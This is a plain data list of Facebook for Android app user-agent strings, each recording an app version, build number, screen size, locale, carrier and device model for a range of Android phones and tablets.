'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G900A;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SCH-I545;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/sv_SE;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1920,height=1080};FBLC/ar_AR;FBCR/ASIACELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS986;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS985 4G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454151;FBDM/{density=1.0,width=1024,height=552};FBLC/en_US;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/K01A;FBSV/5.0;nullFBCA/x86:armeabi-v7a;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1024,height=552};FBLC/en_GB;FBCR/;FBMF/Lenovo;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Tab2A7-10F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1024,height=552};FBLC/fr_FR;FBCR/;FBMF/Gigabyte;FBBD/RCA;FBPN/com.facebook.katana;FBDV/RCT6773W22;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1024,height=720};FBLC/es_ES;FBCR/;FBMF/rockchip;FBBD/rk30sdk;FBPN/com.facebook.katana;FBDV/NBX-T8014;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=1280,height=752};FBLC/fr_CA;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N8010;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=600,height=1024};FBLC/hu_HU;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T113;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=800,height=1232};FBLC/fr_CA;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS Transformer Pad TF300T;FBSV/4.2.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=1280,height=736};FBLC/en_US;FBCR/Verizon Wireless;FBMF/Quanta;FBBD/VERIZON;FBPN/com.facebook.katana;FBDV/QMV7B;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=800,height=1280};FBLC/es_LA;FBCR/Movil GSM ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T231;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=734};FBLC/es_LA;FBCR/CLARO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D290;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=744};FBLC/es_LA;FBCR/Movistar;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2004;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=782};FBLC/en_US;FBCR/Vodafone IN;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C2004;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/VodafoneNZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-S7275T;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9082L;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G355M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9063T;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Tigo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G350L;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=800};FBLC/fr_FR;FBCR/BASE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J100H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/;FBMF/TCT;FBBD/TCT;FBPN/com.facebook.katana;FBDV/ALCATEL ONE TOUCH 5036A;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/BITEL;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI Y550;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=886};FBLC/es_LA;FBCR/Claro AR;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D610AR;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBCR/Bitel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1021;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo A850;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/Micromax;FBBD/Micromax;FBPN/com.facebook.katana;FBDV/A114;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/es_ES;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI G6-L11;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530H;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/entel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/fr_CA;FBCR/Koodo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G386W;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=540,height=960};FBLC/fr_CA;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G386W;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.5,width=800,height=480};FBLC/en_GB;FBCR/Vodafone IN;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I8552;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=2560,height=1600};FBLC/en_US;FBCR/Telstra Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-P605;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Republic;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1031;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5106;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/fr_CA;FBCR/Bell;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5106;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500F;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/Vodafone RO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Ufone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1030;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/ONO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/CLARO;FBMF/Sony Ericsson;FBBD/SEMC;FBPN/com.facebook.katana;FBDV/LT26w;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.1.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500Y;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_CA;FBCR/TELUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I747M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/nl_NL;FBCR/T-Mobile  NL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One X;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/sv_SE;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9301I;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/ar_AR;FBCR/ASIACELL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/StarHub;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9005;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-M919;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_ES;FBCR/Personal;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=782};FBLC/en_US;FBCR/MetroPCS;FBMF/LGE;FBBD/MetroPCS;FBPN/com.facebook.katana;FBDV/LGMS345;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=782};FBLC/en_US;FBCR/cricket;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 520;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Boost Mobile;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5017B;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=888};FBLC/sv_SE;FBCR/Telia;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2303;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/XL Axiata;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A33w;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=720,height=1208};FBLC/en_US;FBCR/TELKOMSEL;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2533;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/de_DE;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5823;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=1196,height=720};FBLC/en_US;FBCR/Vodafone IN;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 728G dual sim;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/!dea;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 820 dual sim;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_ES;FBCR/movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1058;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/Claro;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L23;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/MOVISTAR;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1032;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/movistar;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G850Y;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IDEA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N750;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-E700H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/AT&-T 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/AT&-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-G850A;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/Claro;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500Y;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/EE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/ORANGE;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M9;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_CA;FBCR/Fido;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_CA;FBCR/Koodo;FBMF/LGE;FBBD/google;FBPN/com.facebook.katana;FBDV/Nexus 5;FBSV/6.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_CA;FBCR/TELUS;FBMF/TCL ALCATEL ONETOUCH;FBBD/TCL;FBPN/com.facebook.katana;FBDV/6045I;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/nl_NL;FBCR/vodafone NL;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/ru_RU;FBCR/MTS RUS;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D6503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1794};FBLC/en_US;FBCR/Sprint;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LGLS996;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9005;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]',
'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/;FBMF/Meizu;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/MX5;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]',
